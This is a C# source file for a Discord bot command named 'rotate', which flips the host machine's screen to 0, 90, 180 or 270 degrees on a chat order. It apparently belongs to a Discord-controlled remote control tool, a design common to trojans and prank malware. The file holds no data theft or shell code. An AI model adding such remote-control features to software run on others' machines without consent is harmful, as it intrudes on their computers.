using Discord;
using Discord.Commands;

namespace Main.Source.Bot.Commands
{
    public class Rotate : CommandBase
    {
        public override string Name => "rotate";
        public override string Info => "Rotates the user's screen";
        public override string Use => "-0 | -90 | -180 | -270";

        public override async Task Func(SocketCommandContext socket, string[] args)
        {
            if (args.Length != 1)
            {
                await socket.Message.ReplyAsync("Usage: " + Use);
                return;
            }

            string arguments = args[0];

            bool rotated = false;

            if (Utilities.Parser.GetFlag(arguments, "0"))
            {
                rotated = Functions.ScreenRotate.Rotate(0);
            }
            else if (Utilities.Parser.GetFlag(arguments, "90"))
            {
                rotated = Functions.ScreenRotate.Rotate(1);
            }
            else if (Utilities.Parser.GetFlag(arguments, "180"))
            {
                rotated = Functions.ScreenRotate.Rotate(2);
            }
            else if (Utilities.Parser.GetFlag(arguments, "270"))
            {
                rotated = Functions.ScreenRotate.Rotate(3);
            }
            else
            {
                await socket.Message.ReplyAsync("Usage: " + Use);
            }

            await socket.Message.ReplyAsync($"{(rotated ? "Successfully rotated" : "Failed to rotate")} screen");
        }
    }
}